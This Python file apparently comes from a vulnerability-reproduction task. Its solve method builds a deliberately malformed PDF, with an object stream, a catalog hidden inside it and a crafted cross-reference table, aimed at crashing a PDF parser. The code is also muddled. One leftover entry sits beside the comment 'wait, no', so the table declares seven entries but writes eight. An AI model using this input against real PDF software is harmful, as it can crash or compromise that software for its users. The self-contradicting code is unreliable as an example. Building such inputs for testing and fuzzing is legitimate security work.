class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'%PDF-1.4\n\n'
        obj4_dict = b'4 0 obj\n<< /Type /ObjStm /N 2 /First 12 >>\nstream\n'
        header_stream = b'2 6 12 20 31'
        obj6_data = b'<< /Type /Catalog >>'
        obj20_data = b'null'
        endstream = b'\nendstream\nendobj\n\n'
        offset4 = len(header)
        stream_data = header_stream + obj6_data + obj20_data
        body = header + obj4_dict + stream_data + endstream
        xref_pos = len(body)
        xref = b'xref\n0 7\n0000000000 65535 f \n'
        xref += f'{offset4:010d}'.encode('ascii') + b' 00000 n \n'  # wait, no, for 1? Wait, free for 1,2,3
        # 0 done
        # 1 free
        xref += b'0000000000 65535 f \n'
        # 2 free
        xref += b'0000000000 65535 f \n'
        # 3 free
        xref += b'0000000000 65535 f \n'
        # 4
        xref += f'{offset4:010d}'.encode('ascii') + b' 00000 n \n'
        # 5 free
        xref += b'0000000000 65535 f \n'
        # 6 special
        xref += b'0000000004 00000 n \n'
        body += xref
        trailer_pos = len(body)
        trailer = b'trailer\n<< /Size 7 /Root 6 0 R >>\nstartxref\n'
        trailer += str(xref_pos).encode('ascii') + b'\n%%EOF'
        body += trailer
        return body